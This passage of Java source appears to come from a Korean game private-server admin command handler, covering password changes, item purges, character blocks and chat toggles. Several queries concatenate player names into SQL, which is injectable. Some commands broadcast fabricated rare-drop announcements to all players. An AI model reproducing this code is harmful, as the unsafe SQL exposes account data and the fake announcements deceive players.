			L1PcInstance target = L1World.getInstance().getPlayer(user);
			if (target != null) {
				to_Change_Passwd(gm, target, passwd);
			} else {
				if (!to_Change_Passwd(gm, user, passwd))
					gm.sendPackets("그런 이름을 가진 캐릭터는 없습니다.");
			}
		} catch (Exception e) {
			gm.sendPackets(".암호변경 [캐릭명] [암호]로 입력해주세요.");
		}
	}

	private void to_Change_Passwd(L1PcInstance gm, L1PcInstance pc, String passwd) {
		PreparedStatement statement = null;
		PreparedStatement pstm = null;
		ResultSet rs = null;
		java.sql.Connection con = null;
		try {
			String login = null;
			String password = null;
			con = DatabaseFactory.getInstance().getConnection();
			password = passwd;
			statement = con.prepareStatement(
					"select account_name from characters where char_name Like '" + pc.getName() + "'");
			rs = statement.executeQuery();

			while (rs.next()) {
				login = rs.getString(1);
				pstm = con.prepareStatement("UPDATE accounts SET password=? WHERE login Like '" + login + "'");
				pstm.setString(1, password);
				pstm.execute();
				gm.sendPackets("암호변경 계정: [" + login + "] 암호: [" + passwd + "]");
				gm.sendPackets(pc.getName() + " 암호변경 완료.");
			}
		} catch (Exception e) {
			System.out.println("to_Change_Passwd() Error : " + e);
		} finally {
			SQLUtil.close(rs);
			SQLUtil.close(pstm);
			SQLUtil.close(statement);
			SQLUtil.close(con);
		}
	}

	private boolean to_Change_Passwd(L1PcInstance pc, String name, String passwd) {
		PreparedStatement statement = null;
		PreparedStatement pstm = null;
		ResultSet rs = null;
		java.sql.Connection con = null;
		try {
			String login = null;
			String password = null;
			con = DatabaseFactory.getInstance().getConnection();
			password = passwd;
			statement = con.prepareStatement("select account_name from characters where char_name Like '" + name + "'");
			rs = statement.executeQuery();

			while (rs.next()) {
				login = rs.getString(1);
				pstm = con.prepareStatement("UPDATE accounts SET password=? WHERE login Like '" + login + "'");
				pstm.setString(1, password);
				pstm.execute();
				pc.sendPackets("암호변경 계정: [" + login + "] 암호: [" + passwd + "]");
				pc.sendPackets("해당 캐릭터 암호변경 완료. (미접속중)");
			}
			return true;
		} catch (Exception e) {
			System.out.println("to_Change_Passwd() Error : " + e);
		} finally {
			SQLUtil.close(rs);
			SQLUtil.close(pstm);
			SQLUtil.close(statement);
			SQLUtil.close(con);
		}
		return false;
	}

	private void 퀴즈체인지(L1PcInstance gm, L1PcInstance pc, String newquiz) {
		PreparedStatement statement = null;
		PreparedStatement pstm = null;
		ResultSet rs = null;
		java.sql.Connection con = null;
		try {
			String login = null;
			String quiz = null;
			con = DatabaseFactory.getInstance().getConnection();
			quiz = newquiz;
			statement = con.prepareStatement(
					"select account_name from characters where char_name Like '" + pc.getName() + "'");
			rs = statement.executeQuery();

			while (rs.next()) {
				login = rs.getString(1);
				pstm = con.prepareStatement("UPDATE accounts SET quiz=? WHERE login Like '" + login + "'");
				pstm.setString(1, quiz);
				pstm.execute();
				gm.sendPackets("퀴즈변경계정: [" + login + "] 퀴즈: [" + quiz + "]");
				gm.sendPackets(pc.getName() + " 님의 퀴즈변경 완료.");
			}
		} catch (Exception e) {
			System.out.println("to_Change_Passwd() Error : " + e);
		} finally {
			SQLUtil.close(rs);
			SQLUtil.close(pstm);
			SQLUtil.close(statement);
			SQLUtil.close(con);
		}
	}

	private boolean 퀴즈체인지(L1PcInstance pc, String name, String newquiz) {
		PreparedStatement statement = null;
		PreparedStatement pstm = null;
		ResultSet rs = null;
		java.sql.Connection con = null;
		try {
			String login = null;
			String quiz = null;
			con = DatabaseFactory.getInstance().getConnection();
			quiz = newquiz;
			statement = con.prepareStatement("select account_name from characters where char_name Like '" + name + "'");
			rs = statement.executeQuery();

			while (rs.next()) {
				login = rs.getString(1);
				pstm = con.prepareStatement("UPDATE accounts SET quiz=? WHERE login Like '" + login + "'");
				pstm.setString(1, quiz);
				pstm.execute();
				pc.sendPackets("퀴즈변경계정: [" + login + "] 암호: [" + quiz + "]");
				pc.sendPackets("해당 캐릭터 퀴즈변경 완료. (미접속중)");
			}
			return true;
		} catch (Exception e) {
			System.out.println("to_Change_Passwd() Error : " + e);
		} finally {
			SQLUtil.close(rs);
			SQLUtil.close(pstm);
			SQLUtil.close(statement);
			SQLUtil.close(con);
		}
		return false;
	}

	private static int delItemlist[] = { 307, 308, 309, 310, 311, 312, 313, 314, 21095, 30146, 30147, 30150 };

	public synchronized static void 아놀드이벤트삭제() {
		try {
			if (delItemlist.length <= 0)
				return;

			for (L1PcInstance tempPc : L1World.getInstance().getAllPlayers()) {
				if (tempPc == null)
					continue;
				for (int i = 0; i < delItemlist.length; i++) {
					L1ItemInstance[] item = tempPc.getInventory().findItemsId(delItemlist[i]);
					if (item != null && item.length > 0) {
						for (int o = 0; o < item.length; o++) {
							tempPc.getInventory().removeItem(item[o]);
						}
					}
					try {
						PrivateWarehouse pw = WarehouseManager.getInstance()
								.getPrivateWarehouse(tempPc.getAccountName());
						L1ItemInstance[] item2 = pw.findItemsId(delItemlist[i]);
						if (item2 != null && item2.length > 0) {
							for (int o = 0; o < item2.length; o++) {
								pw.removeItem(item2[o]);
							}
						}
					} catch (Exception e) {
					}
					try {
						if (tempPc.getClanid() > 0) {
							ClanWarehouse cw = WarehouseManager.getInstance().getClanWarehouse(tempPc.getClanname());
							L1ItemInstance[] item3 = cw.findItemsId(delItemlist[i]);
							if (item3 != null && item3.length > 0) {
								for (int o = 0; o < item3.length; o++) {
									cw.removeItem(item3[o]);
								}
							}
						}
					} catch (Exception e) {
					}
					try {
						if (tempPc.getPetList().size() > 0) {
							for (L1NpcInstance npc : tempPc.getPetList().values()) {
								L1ItemInstance[] pitem = npc.getInventory().findItemsId(delItemlist[i]);
								if (pitem != null && pitem.length > 0) {
									for (int o = 0; o < pitem.length; o++) {
										npc.getInventory().removeItem(pitem[o]);
									}
								}
							}
						}
					} catch (Exception e) {
					}
				}
			}
			try {
				for (L1Object obj : L1World.getInstance().getAllItem()) {
					if (!(obj instanceof L1ItemInstance))
						continue;
					L1ItemInstance temp_item = (L1ItemInstance) obj;
					if (temp_item.getItemOwner() == null) {
						if (temp_item.getX() == 0 && temp_item.getY() == 0)
							continue;
					}
					for (int ii = 0; ii < delItemlist.length; ii++) {
						if (delItemlist[ii] == temp_item.getItemId()) {
							L1Inventory groundInventory = L1World.getInstance().getInventory(temp_item.getX(),
									temp_item.getY(), temp_item.getMapId());
							groundInventory.removeItem(temp_item);
							break;
						}
					}

				}
			} catch (Exception e) {
			}
			StringBuilder sb = new StringBuilder();
			for (int i = 0; i < delItemlist.length; i++) {
				sb.append(+delItemlist[i]);
				if (i < delItemlist.length - 1) {
					sb.append(",");
				}
			}
			Delete(sb.toString());

			/*
			 * for(int i = 0; i < delItemlist.length; i++){
			 * Delete(delItemlist[i]); wareDelete(delItemlist[i]);
			 * ClanwareDelete(delItemlist[i]); }
			 */
		} catch (Exception e) {
		}
	}

	private static void Delete(String id_name) {
		Connection con = null;
		PreparedStatement pstm = null;
		try {
			con = DatabaseFactory.getInstance().getConnection();
			pstm = con.prepareStatement("delete FROM _cha_inv_items WHERE item_id IN (" + id_name + ")");
			pstm.executeUpdate();
		} catch (Exception e) {
			e.printStackTrace();
		} finally {
			SQLUtil.close(pstm);
		}
		try {
			pstm = con.prepareStatement("delete FROM character_warehouse WHERE item_id in (" + id_name + ")");
			pstm.executeUpdate();
		} catch (Exception e) {
			e.printStackTrace();
		} finally {
			SQLUtil.close(pstm);
		}
		try {
			pstm = con.prepareStatement("delete FROM clan_warehouse WHERE item_id in (" + id_name + ")");
			pstm.executeUpdate();
		} catch (Exception e) {
			e.printStackTrace();
		} finally {
			SQLUtil.close(pstm);
			SQLUtil.close(con);
		}
	}

	private void findMagicDodge(L1PcInstance gm, String param) {
		L1PcInstance pc = L1World.getInstance().findpc(param);
		if (pc != null) {
			gm.sendPackets(String.format("%s의 마법 회피율 %d", param, pc.getMagicDodgeProbability()));
		} else {
			gm.sendPackets(String.format("%s를 찾을 수 없습니다.", param));
		}
	}

	private static int _effectNum = 0;
	private static Object _effectLock = new Object();

	private void showNextEffect(L1PcInstance gm) {
		int num = 1;

		synchronized (_effectLock) {
			num = _effectNum;
			_effectNum++;
		}
		SC_SkillSound.send(gm, gm.getId(), num);
		gm.sendPackets(String.format("[%d]", num));
	}

	private void showNameId(L1PcInstance gm, String param) {
		try {
			SC_ServerMessage.send(gm, 403, "$" + param);
		} catch (Exception e) {

		}
	}

	private void showEffectInit(L1PcInstance gm, String param) {
		int effNum = 0;
		try {
			StringTokenizer st = new StringTokenizer(param);
			effNum = Integer.parseInt(st.nextToken(), 10);
		} catch (Exception e) {
		}
		synchronized (_effectLock) {
			_effectNum = effNum;
			gm.sendPackets(effNum + "으로 초기화 되었습니다.");
		}
	}

	public static String _sleepingMessage;
	public static String _sleepingTitle;

	private void setSleepingMode(L1PcInstance gm, String param) {
		int num = 0;
		PreparedStatement pstm = null;
		ResultSet rs = null;
		Connection con = null;
		try {
			StringTokenizer st = new StringTokenizer(param);
			num = Integer.parseInt(st.nextToken(), 10);
			con = DatabaseFactory.getInstance().getConnection();
			pstm = con.prepareStatement("select * from tb_sleeping_messages where id=?");
			pstm.setInt(1, num);
			rs = pstm.executeQuery();
			if (rs.next()) {
				_sleepingTitle = rs.getString("title");
				_sleepingMessage = rs.getString("content");
				gm.sendPackets(String.format("잠수 메시지가 [%s]로 설정되었습니다.", _sleepingMessage));
			} else
				gm.sendPackets(String.format("[%d]번의 잠수 메시지는 없습니다.", num));
		} catch (Exception e) {
			gm.sendPackets(".잠수모드 [잠수메시지 번호] 를 입력해주세요.");
		} finally {
			SQLUtil.close(rs, pstm, con);
		}
	}

	private void unSetSleepingMode(L1PcInstance gm, String param) {
		_sleepingTitle = null;
		_sleepingMessage = null;
		gm.sendPackets("잠수모드가 해제 되었습니다.");
	}

	private void deleteUseType(L1PcInstance gm) {
		try {
			for (L1ItemInstance item : m_use_type_items) {
				SC_DeleteInventoryItem.send(gm, item);
			}
			m_use_type_items.clear();
		} catch (Exception e) {
		}
	}
	public static void removeInstance(L1PcInstance gm, String param){
		StringTokenizer st = new StringTokenizer(param);
		String code = st.nextToken();
		L1ClanJoinInstance cjInstance = _clan_to_cj.remove(code);
		if(cjInstance != null){
			cjInstance.dispose();		
		}
	}

	private static ArrayList<L1ItemInstance> m_use_type_items = new ArrayList<L1ItemInstance>();
	private void showUseType(L1PcInstance gm, String param) {
	    try {
	        if (param.equalsIgnoreCase("삭제")) {
	            deleteUseType(gm);
	            return;
	        }

	        StringTokenizer st = new StringTokenizer(param);
	        int start = Integer.parseInt(st.nextToken());
	        int end = Integer.parseInt(st.nextToken()) + start;
	        long notiWire_present = 0L;
	        java.util.List<l1j.server.server.packets.Protocol.Packet.Inventory.ItemInfo> notiWire_items = new java.util.LinkedList<>();
	        java.util.List<byte[]> notiWire_rawItems = new java.util.LinkedList<>();

	        L1Item temp = ItemTable.getInstance().getTemplate(410016);
	        for (int i = start; i <= end; i++){
	            L1ItemInstance item = new L1ItemInstance();
	            item.setId(i);
	            item.setItem(temp);
	            item.setBless(temp.getBless());
	            item.setIdentified(false);
	            { notiWire_items.add((ItemInfo.newInstance(item, i, String.valueOf(i).getBytes(), item.getBless()))); }
	            m_use_type_items.add(item);
	        }
	        SC_AddInventoryNoti.sendFields(gm, notiWire_present, notiWire_items, notiWire_rawItems, false, 0);
	    } catch (Exception e) {
	        gm.sendPackets(".유즈타입 [시작번호] [끝번호]");
	    }
	}

	private void grangKinDB_Reset() {
		PreparedStatement pstm = null;
		Connection con = null;
		try {
			con = DatabaseFactory.getInstance().getConnection();
			pstm = con.prepareStatement("UPDATE accounts SET GrangKinAngerTime=?");
			pstm.setInt(1, 0);
			pstm.execute();
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	private void showWarList(L1PcInstance gm) {
		try {
			int i = 0;
			L1World.getInstance().createWarStream().forEach((MJWar war) -> {
				gm.sendPackets(war.toString());
			});
		} catch (Exception e) {
		}
	}

	private static void setCharBlock(L1PcInstance gm, String param) {
		PreparedStatement pstm = null;
		ResultSet rs = null;
		Connection con = null;

		try {
			StringTokenizer st = new StringTokenizer(param);
			String name = st.nextToken();
			if (name == null || name.equalsIgnoreCase(""))
				throw new Exception("");

			con = DatabaseFactory.getInstance().getConnection();
			pstm = con.prepareStatement("select * from characters where char_name=?");
			pstm.setString(1, name);
			rs = pstm.executeQuery();

			if (!rs.next()) {
				gm.sendPackets(String.format("[%s]을(를) 찾을 수 없습니다.", name));
				return;
			}

			int objid = rs.getInt("objid");
			L1PcInstance pc = L1World.getInstance().getPlayer(name);
			SQLUtil.close(rs, pstm);

			pstm = con.prepareStatement("insert ignore into tb_character_block set objid=?, name=?");
			pstm.setInt(1, objid);
			pstm.setString(2, name);
			pstm.executeUpdate();

			gm.sendPackets(String.format("캐릭터 [%s]을(를) 압류했습니다.", name));
			SC_PacketBox.send(pc, SC_PacketBox.GREEN_MESSAGE, "\\f3-------------------------------------------------------------------");
			SC_PacketBox.send(pc, SC_PacketBox.GREEN_MESSAGE, "당신의 계정내 현재 캐릭터가 압류 되었습니다.");
			SC_PacketBox.send(pc, SC_PacketBox.GREEN_MESSAGE, "\\f3-------------------------------------------------------------------");
			pc.sendPackets("\\f1당신의 계정내 현재 캐릭터가 압류 되었습니다.");
			ThreadPool.getInstance().schedule(new DelayRestart(pc), 3000);
		} catch (Exception e) {
			gm.sendPackets(".캐릭압류 [압류 캐릭터이름]");
		} finally {
			SQLUtil.close(rs, pstm, con);
		}
	}

	static class DelayRestart implements Runnable {
		private L1PcInstance _pc;

		DelayRestart(L1PcInstance pc) {
			_pc = pc;
		}

		@Override
		public void run() {
			try {
				if (_pc != null) {
					SC_Restart.send(_pc, _pc.getId(), 1);
					_pc.logout();
				}
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
	}

	private static void setCharBlockDelete(L1PcInstance gm, String param) {
		PreparedStatement pstm = null;
		ResultSet rs = null;
		Connection con = null;

		try {
			StringTokenizer st = new StringTokenizer(param);
			String name = st.nextToken();
			if (name == null || name.equalsIgnoreCase(""))
				throw new Exception("");

			con = DatabaseFactory.getInstance().getConnection();
			pstm = con.prepareStatement("delete from tb_character_block where name=?");
			pstm.setString(1, name);
			pstm.executeUpdate();
			gm.sendPackets(String.format("캐릭터 [%s]을(를) 압류를 해제 했습니다.", name));
		} catch (Exception e) {
			gm.sendPackets(".캐릭압류해제 [해제 캐릭터이름]");
		} finally {
			SQLUtil.close(rs, pstm, con);
		}
	}

	public static boolean isCharacterBlock(String name) {
		Connection con = null;
		PreparedStatement pstm = null;
		ResultSet rs = null;

		try {
			con = DatabaseFactory.getInstance().getConnection();
			pstm = con.prepareStatement("select * from tb_character_block where name=?");
			pstm.setString(1, name);
			rs = pstm.executeQuery();
			return rs.next();
		} catch (Exception e) {
			e.printStackTrace();
		} finally {
			SQLUtil.close(rs, pstm, con);
		}
		return true;
	}

	private int _currentNum = -1 + 825;

	private void showProto(L1PcInstance gm, String param) {
		try {
			_currentNum = Integer.parseInt(param);
		} catch (Exception e) {
		}
	}

	private void showNextProto(L1PcInstance gm, String param) {
		SC_ShowCmd.sendText(gm, String.valueOf(_currentNum));
		if (_currentNum != 13 && _currentNum != 14) {
			SC_ShowCmd.sendProto8(gm, _currentNum);
			SC_ShowCmd.sendProtoA(gm, _currentNum);
			/*try{
			SC_HUNTING_GUIDE_BOOKMARK_NOTI noti = SC_HUNTING_GUIDE_BOOKMARK_NOTI.newInstance();
			HUNTING_GUIDE_BOOKMARK_DATA data = HUNTING_GUIDE_BOOKMARK_DATA.newInstance();
			data.set_desc("hello");
			data.set_icon(3030);
			data.set_level(70);
			data.set_mapNo(4);
			data.set_seq(0);
			data.set_strIndex("0");
			data.set_x(32767);
			data.set_y(32767);
			noti.add_bookmarks(data);
			l1j.server.MJTemplate.MJProto.IO.ProtoOutputStream stream =
					l1j.server.MJTemplate.MJProto.IO.ProtoOutputStream.newInstance(noti.getSerializedSize() + WireFormat.WRITE_EXTENDED_SIZE, _currentNum);
				try{
					noti.writeTo(stream);
				} catch (IOException e) {
					e.printStackTrace();
				}
			gm.sendPackets(stream);
			}catch(Exception e){
				e.printStackTrace();
			}*/
		}
		_currentNum++;
	}
	public static boolean 일반채팅 = true; 
	public static boolean 유저명령어 = false;
	private void 일반채팅(L1PcInstance gm, String param) {
		try {
			if (param.equalsIgnoreCase("켬")) {
				일반채팅 = false;
				유저명령어 = true;
				SC_SystemMessage.send(gm, "\\f:▶모든 채팅을 OFF하였습니다 ◀");
			} else if (param.equalsIgnoreCase("끔")) {
				일반채팅 = true;

				SC_SystemMessage.send(gm, "\\f:▶ 귓말을 제외한 모든 채팅을 ON하였습니다 ◀");
			}
		} catch (Exception e) {
			gm.sendPackets(".채팅차단 켬/끔");
			gm.sendPackets("귓말을 제외한 모든 채팅이 금지됩니다.");
		}
	}
	private void showChat(L1PcInstance gm, String param) {
		SC_ChatMessageNoti.sendNotice(gm, param, "하하");
		// SC_ChatMessageNoti.send(gm, SC_ChatMessageNoti.CHAT_WHISPER,
		// param, null, "메티스", null, -1);
		SC_ChatMessageNoti.send(gm, SC_ChatMessageNoti.CHAT_ARENA_OBSERVER, "아레나옵저버", MJSimpleRgb.red(),
				gm.getName(), gm, -1);
		SC_ChatMessageNoti.send(gm, SC_ChatMessageNoti.CHAT_ARENA_TEAM, "아레나팀", MJSimpleRgb.red(), gm.getName(),
				gm, -1);
		SC_ChatMessageNoti.send(gm, SC_ChatMessageNoti.CHAT_CLASS, "클래스", MJSimpleRgb.red(), gm.getName(), gm, -1);
		SC_ChatMessageNoti.send(gm, SC_ChatMessageNoti.CHAT_PLEDGE_ALLIANCE, "혈맹알리언스", MJSimpleRgb.red(),
				gm.getName(), gm, -1);
		SC_ChatMessageNoti.send(gm, SC_ChatMessageNoti.CHAT_PLEDGE_NOTICE, "혈맹공지", MJSimpleRgb.red(),
				gm.getName(), gm, -1);
		SC_ChatMessageNoti.send(gm, SC_ChatMessageNoti.CHAT_PLEDGE_PRINCE, "혈맹왕자", MJSimpleRgb.red(),
				gm.getName(), gm, -1);
		SC_ChatMessageNoti.send(gm, SC_ChatMessageNoti.CHAT_ROOM_ARENA_ALL, "룸아레나올", MJSimpleRgb.red(),
				gm.getName(), gm, -1);
		SC_ChatMessageNoti.send(gm, SC_ChatMessageNoti.CHAT_TEAM, "팀", MJSimpleRgb.red(), gm.getName(), gm, -1);
		SC_ChatMessageNoti.send(gm, SC_ChatMessageNoti.CHAT_TRADE, "트레이드", MJSimpleRgb.red(), gm.getName(), gm, -1);
		SC_ChatMessageNoti.send(gm, SC_ChatMessageNoti.CHAT_CHAT_PARTY, "채팅파티", MJSimpleRgb.red(), gm.getName(),
				gm, -1);
		SC_ChatMessageNoti.send(gm, SC_ChatMessageNoti.CHAT_SHOUT, "샤우트", MJSimpleRgb.red(), gm.getName(), gm, -1);
		SC_ChatMessageNoti.send(gm, SC_ChatMessageNoti.CHAT_HUNT_PARTY, "헌트파티", MJSimpleRgb.red(), gm.getName(),
				gm, -1);
	}

	private void ping(L1PcInstance gm, String param) {
		if (param.equalsIgnoreCase("켬")) {
			SC_Ping._isRun = true;
			SC_Ping.sendForGM(gm);
		} else if (param.equalsIgnoreCase("끔")) {
			SC_Ping._isRun = false;
			SC_Ping._lastMs = 0L;
		}
	}

	public static boolean 전체채팅 = true;

	private void 전체채팅(L1PcInstance gm, String param) {
		try {
			if (param.equalsIgnoreCase("켬")) {
				전체채팅 = true;
				SC_SystemMessage.send(gm, "\\f:▶ 전체채팅을 ON하였습니다 ◀");
			} else if (param.equalsIgnoreCase("끔")) {
				전체채팅 = false;
				SC_SystemMessage.send(gm, "\\f:▶ 전체채팅을 OFF하였습니다 ◀");
			}
		} catch (Exception e) {
			gm.sendPackets(".전체채팅 켬/끔");
		}
	}
	public static boolean IS_PROTECTION = false;
	

	


	private void setProtectionMode(L1PcInstance gm, String param) {
		try {
		if (param.equalsIgnoreCase("켬")) {
			IS_PROTECTION = true;
			SC_PacketBox.broadcastGreen("현재 보호모드로 인해, 페널티가 적용 되지 않습니다. 안심하시고 사냥하셔도 됩니다.");
		} else if (param.equalsIgnoreCase("끔")) {
			IS_PROTECTION = false;
			SC_PacketBox.broadcastGreen("잠시후 보호모드가 해지 됩니다. 페널티에 주의 하시길 바랍니다.");
		} else if (param.equalsIgnoreCase("상태")) {

		} else
			throw new Exception("");
		gm.sendPackets(String.format("현재 보호모드 상태 [%s짐]", IS_PROTECTION ? "켜" : "꺼"));
	} catch (Exception e) {
		gm.sendPackets(".보호모드 [켬/끔/상태]");
	}
		}

	// 커멘드 새로추가
	private void AccountCheck(L1PcInstance pc, String param) {
		try {
			StringTokenizer st = new StringTokenizer(param);
			String name = st.nextToken();
			CharacterTable.getInstance().CharacterAccountCheck(pc, name);
		} catch (Exception e) {
			SC_SystemMessage.send(pc, ".계정검사 [캐릭터명]");
		}
	}

	private void AccountCheck1(L1PcInstance pc, String param) {
		try {
			StringTokenizer st = new StringTokenizer(param);
			String name = st.nextToken();
			CharacterTable.getInstance().CharacterAccountCheck1(pc, name);
		} catch (Exception e) {
			SC_SystemMessage.send(pc, ".계정확인 [캐릭터명]");
		}
	}
	public void 원격거래(L1PcInstance gm, String param) {
		try {
			StringTokenizer st = new StringTokenizer(param);
			String Trade_name = st.nextToken();
			L1PcInstance target = null;
			target = L1World.getInstance().getPlayer(Trade_name);
			CIOClient clientthread = target.getNetConnection();
			clientthread.getActiveChar();
			if (target != null) {
				
				if (target.isPrivateShop() || target.isFishing() || target.isDeathMatch() 
						 || target.isParalyzed() ) {
					SC_SystemMessage.send(gm, "\\f:상대방이 원격교환을 받을수 없는 상태입니다.");
					return;
				}
				if (target.getTradeID() > 0) {
					SC_SystemMessage.send(gm, "\\f:상대방은 현재 교환 중인 상태 입니다.");
					return;
				}
				if (Trade_name.equals(gm.getName())) {
					SC_SystemMessage.send(gm, "\\f:자신에게는 원격교환을 신청할 수 없습니다.");
					return;
				}
			
				if (!target.isParalyzed()) {
					gm.setTradeID(target.getId());
					target.setTradeID(gm.getId());
					SC_MessageYN.send(target, 252, gm.getName());
					SC_SystemMessage.send(gm, "\\f:" + target.getName() + "님에게 거래를 신청했습니다.");
					SC_PacketBox.send(target, SC_PacketBox.GREEN_MESSAGE, "\\f=메티스로부터 당신에게 원격교환을 신청하였습니다.");
				} else {
					SC_SystemMessage.send(gm, "\\f:상대방이 거래를 취소 하였습니다.");
				}
			}
		} catch (Exception e) {
			SC_SystemMessage.send(gm, "\\f:.원격교환 [캐릭터명]");
		}
	}
	private void jakjak(L1PcInstance gm) { // 데페
		L1ItemInstance item = null;
		item = ItemTable.getInstance().createItem(210125);
		SC_PacketBox.broadcastGreen("누군가가 샌드 웜의 모래 주머니에서 (" + item.getName() + ") 를(을) 획득하였습니다.");
		SC_SystemMessage.broadcast("누군가가 샌드 웜의 모래 주머니에서 (" + item.getName() + ") 를(을) 획득하였습니다.");
	}

	private void jakjak2(L1PcInstance gm) { // 아머
		L1ItemInstance item = null;
		item = ItemTable.getInstance().createItem(5559);
		SC_PacketBox.broadcastGreen("누군가가 샌드 웜의 모래 주머니에서 (" + item.getName() + ") 를(을) 획득하였습니다.");
		SC_SystemMessage.broadcast("누군가가 샌드 웜의 모래 주머니에서 (" + item.getName() + ") 를(을) 획득하였습니다.");
	}
	private void Jindeath(L1PcInstance gm) {
		L1ItemInstance item = null;
		item = ItemTable.getInstance().createItem(505011);
		SC_PacketBox.broadcastGreen("어느 아덴 용사 님께서 진 데스나이트의 유물 상자에서 \\f3("+ item.getName() +")\\f2 를(을) 획득하였습니다.");
		SC_SystemMessage.broadcast("어느 아덴 용사 님께서 진 데스나이트의 유물 상자에서 ("+ item.getName() +") 를(을) 획득하였습니다.");
	}
	private void Jindeath1(L1PcInstance gm) {
		L1ItemInstance item = null;
		item = ItemTable.getInstance().createItem(505015);
		SC_PacketBox.broadcastGreen("어느 아덴 용사 님께서 진 데스나이트의 유물 상자에서 \\f3("+ item.getName() +")\\f2 를(을) 획득하였습니다.");
		SC_SystemMessage.broadcast("어느 아덴 용사 님께서 진 데스나이트의 유물 상자에서 ("+ item.getName() +") 를(을) 획득하였습니다.");
	}
	private void Jindeath2(L1PcInstance gm) {
		L1ItemInstance item = null;
		item = ItemTable.getInstance().createItem(505012);
		SC_PacketBox.broadcastGreen("어느 아덴 용사 님께서 진 데스나이트의 유물 상자에서 \\f3("+ item.getName() +")\\f2 를(을) 획득하였습니다.");
		SC_SystemMessage.broadcast("어느 아덴 용사 님께서 진 데스나이트의 유물 상자에서 ("+ item.getName() +") 를(을) 획득하였습니다.");
	}
	private void Jindeath3(L1PcInstance gm) {
		L1ItemInstance item = null;
		item = ItemTable.getInstance().createItem(620);
		SC_PacketBox.broadcastGreen("어느 아덴 용사 님께서 진 데스나이트의 유물 상자에서 \\f3("+ item.getName() +")\\f2 를(을) 획득하였습니다.");
		SC_SystemMessage.broadcast("어느 아덴 용사 님께서 진 데스나이트의 유물 상자에서 ("+ item.getName() +") 를(을) 획득하였습니다.");
	}
	private void Jindeath4(L1PcInstance gm) {
		L1ItemInstance item = null;
		item = ItemTable.getInstance().createItem(625);
		SC_PacketBox.broadcastGreen("어느 아덴 용사 님께서 진 데스나이트의 유물 상자에서 \\f3("+ item.getName() +")\\f2 를(을) 획득하였습니다.");
		SC_SystemMessage.broadcast("어느 아덴 용사 님께서 진 데스나이트의 유물 상자에서 ("+ item.getName() +") 를(을) 획득하였습니다.");
	}
	private void Jindeath5(L1PcInstance gm) {
		L1ItemInstance item = null;
		item = ItemTable.getInstance().createItem(626);
		SC_PacketBox.broadcastGreen("어느 아덴 용사 님께서 진 데스나이트의 유물 상자에서 \\f3("+ item.getName() +")\\f2 를(을) 획득하였습니다.");
		SC_SystemMessage.broadcast("어느 아덴 용사 님께서 진 데스나이트의 유물 상자에서 ("+ item.getName() +") 를(을) 획득하였습니다.");
	}
	private void Jindeath6(L1PcInstance gm) {
		L1ItemInstance item = null;
		item = ItemTable.getInstance().createItem(623);
		SC_PacketBox.broadcastGreen("어느 아덴 용사 님께서 진 데스나이트의 유물 상자에서 \\f3("+ item.getName() +")\\f2 를(을) 획득하였습니다.");
		SC_SystemMessage.broadcast("어느 아덴 용사 님께서 진 데스나이트의 유물 상자에서 ("+ item.getName() +") 를(을) 획득하였습니다.");
	}
	private void Jindeath7(L1PcInstance gm) {
		L1ItemInstance item = null;
		item = ItemTable.getInstance().createItem(618);
		SC_PacketBox.broadcastGreen("어느 아덴 용사 님께서 진 데스나이트의 유물 상자에서 \\f3("+ item.getName() +")\\f2 를(을) 획득하였습니다.");
		SC_SystemMessage.broadcast("어느 아덴 용사 님께서 진 데스나이트의 유물 상자에서 ("+ item.getName() +") 를(을) 획득하였습니다.");
	}
	private void Jindeath8(L1PcInstance gm) {
		L1ItemInstance item = null;
		item = ItemTable.getInstance().createItem(619);
		SC_PacketBox.broadcastGreen("어느 아덴 용사 님께서 진 데스나이트의 유물 상자에서 \\f3("+ item.getName() +")\\f2 를(을) 획득하였습니다.");
		SC_SystemMessage.broadcast("어느 아덴 용사 님께서 진 데스나이트의 유물 상자에서 ("+ item.getName() +") 를(을) 획득하였습니다.");
	}
	private void Jindeath9(L1PcInstance gm) {
		L1ItemInstance item = null;
		item = ItemTable.getInstance().createItem(616);
		SC_PacketBox.broadcastGreen("어느 아덴 용사 님께서 진 데스나이트의 유물 상자에서 \\f3("+ item.getName() +")\\f2 를(을) 획득하였습니다.");
		SC_SystemMessage.broadcast("어느 아덴 용사 님께서 진 데스나이트의 유물 상자에서 ("+ item.getName() +") 를(을) 획득하였습니다.");
	}
	private void Jindeath10(L1PcInstance gm) {
		L1ItemInstance item = null;
		item = ItemTable.getInstance().createItem(622);
		SC_PacketBox.broadcastGreen("어느 아덴 용사 님께서 진 데스나이트의 유물 상자에서 \\f3("+ item.getName() +")\\f2 를(을) 획득하였습니다.");
		SC_SystemMessage.broadcast("어느 아덴 용사 님께서 진 데스나이트의 유물 상자에서 ("+ item.getName() +") 를(을) 획득하였습니다.");
	}
	private void Jindeath11(L1PcInstance gm) {
		L1ItemInstance item = null;
		item = ItemTable.getInstance().createItem(617);
		SC_PacketBox.broadcastGreen("어느 아덴 용사 님께서 진 데스나이트의 유물 상자에서 \\f3("+ item.getName() +")\\f2 를(을) 획득하였습니다.");
		SC_SystemMessage.broadcast("어느 아덴 용사 님께서 진 데스나이트의 유물 상자에서 ("+ item.getName() +") 를(을) 획득하였습니다.");
	}
	
	private void jakjak3(L1PcInstance gm) { // 카배
		L1ItemInstance item = null;
		item = ItemTable.getInstance().createItem(41148);
		SC_PacketBox.broadcastGreen("누군가가 에르자베의 알에서 (" + item.getName() + ") 를(을) 획득하였습니다.");
		SC_SystemMessage.broadcast("누군가가 에르자베의 알에서 (" + item.getName() + ") 를(을) 획득하였습니다.");
	}

	private void dolldemon(L1PcInstance gm) { // 데몬인형
		L1ItemInstance item = null;
		item = ItemTable.getInstance().createItem(745);
		SC_PacketBox.broadcastGreen("누군가가 " + item.getName() + " 합성에 성공 하였습니다.");
		SC_ChatPacket.broadcastMessage("\\fH누군가가 " + item.getName() + " 합성에 성공 하였습니다.");
	}

	private void dolldeath(L1PcInstance gm) { // 데스인형
		L1ItemInstance item = null;
		item = ItemTable.getInstance().createItem(746);
		SC_PacketBox.broadcastGreen("누군가가 " + item.getName() + " 합성에 성공 하였습니다.");
		SC_ChatPacket.broadcastMessage("\\fH누군가가 " + item.getName() + " 합성에 성공 하였습니다.");
	}

	private void dolltarak(L1PcInstance gm) { // 타락인형
		L1ItemInstance item = null;
		item = ItemTable.getInstance().createItem(3000352);
		SC_PacketBox.broadcastGreen("누군가가 " + item.getName() + " 합성에 성공 하였습니다.");
